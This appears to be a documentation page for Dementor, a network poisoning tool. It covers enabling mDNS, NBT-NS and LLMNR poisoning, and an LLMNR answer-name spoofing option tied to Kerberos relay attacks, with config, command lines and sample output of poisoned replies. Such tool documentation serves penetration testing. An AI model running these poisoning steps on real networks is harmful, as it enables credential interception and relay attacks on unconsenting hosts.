.. _examples_multicast:

Multicast Poisoning ⚙️
======================


.. _example_multicast_mdns:

Multicast Poisoning
-------------------

To enable multicast poisoning, you have to enable the poisoners in the configuration file
(:attr:`Dementor.mDNS`, :attr:`Dementor.NBTNS` and :attr:`Dementor.LLMNR`).

A service discovery can be triggered from a Windows host for example (assuming mDNS is
active). For instance, when trying to access file share ``FILESERVER01`` in the File
Explorer, Windows falls back to mDNS if the name can't be resolved through normal DNS
queries.

The output of Dementor should look like this (analyze mode):

.. container:: demo

    .. code-block:: console

        $ Dementor -I <INTERFACE> -A
        [...]
        MDNS       192.168.56.115  5353   [*] Request for FILESERVER01.local (class: IN, type: A)
        MDNS       192.168.56.115  5353   [*] Request for FILESERVER01.local (class: IN, type: AAAA)
        [...]

The Windows host sends two queries, one for IPv4 (``A``) and one for IPv6 (``AAAA``). This packet is
sent via Layer 2 broadcast and Layer 3 multicast to all devices on the subnet (mDNS is link-local
only). All devices listening on port ``5353`` receive it.


.. _examples_multicast_llmnr_answername:

LLMNR Answer-Name Spoofing
--------------------------

Building on standard multicast poisoning techniques, Synacktiv introduced an advanced method that
enables Kerberos relaying attacks through manipulated response names. This behavior can be triggered
by setting a custom :attr:`LLMNR.AnswerName`.


.. seealso::

    Synacktiv's excellent write-up on how to leverage this behavior for pre-authenticated Kerberos relay:
    `Abusing multicast poisoning for pre-authenticated Kerberos relay over HTTP with Responder and krbrelayx <https://www.synacktiv.com/publications/abusing-multicast-poisoning-for-pre-authenticated-kerberos-relay-over-http-with>`_


.. tabs::

    .. tab:: Dementor.toml

        .. code-block:: toml
            :emphasize-lines: 2

            [LLMNR]
            AnswerName = "other-srv"


    .. tab:: CLI

        .. code-block:: console

            $ Dementor -I "$INTERFACE" -O LLMNR.AnswerName="other-srv"


.. container:: demo

    .. code-block:: console
        :caption: Dementor output if :attr:`LLMNR.AnswerName` is set (here ``"other-srv"``)

        LLMNR      fe80::8930:4b9c:f67c:f9bf 5355   [*] Query for SomeService (type: A)
        LLMNR      fe80::8930:4b9c:f67c:f9bf 5355   [+] Sent poisoned answer to fe80::8930:4b9c:f67c:f9bf (spoofed name: other-srv)
        LLMNR      192.168.56.116            5355   [*] Query for SomeService (type: A)
        LLMNR      192.168.56.116            5355   [+] Sent poisoned answer to 192.168.56.116 (spoofed name: other-srv)
        LLMNR      fe80::8930:4b9c:f67c:f9bf 5355   [*] Query for SomeService (type: AAAA)
        LLMNR      fe80::8930:4b9c:f67c:f9bf 5355   [+] Sent poisoned answer to fe80::8930:4b9c:f67c:f9bf (spoofed name: other-srv)
        LLMNR      192.168.56.116            5355   [*] Query for SomeService (type: AAAA)
        LLMNR      192.168.56.116            5355   [+] Sent poisoned answer to 192.168.56.116 (spoofed name: other-srv)
        LLMNR      fe80::8930:4b9c:f67c:f9bf 5355   [*] Query for SomeService (type: A)
        LLMNR      fe80::8930:4b9c:f67c:f9bf 5355   [+] Sent poisoned answer to fe80::8930:4b9c:f67c:f9bf (spoofed name: other-srv)
        LLMNR      192.168.56.116            5355   [*] Query for SomeService (type: A)
        LLMNR      192.168.56.116            5355   [+] Sent poisoned answer to 192.168.56.116 (spoofed name: other-srv)

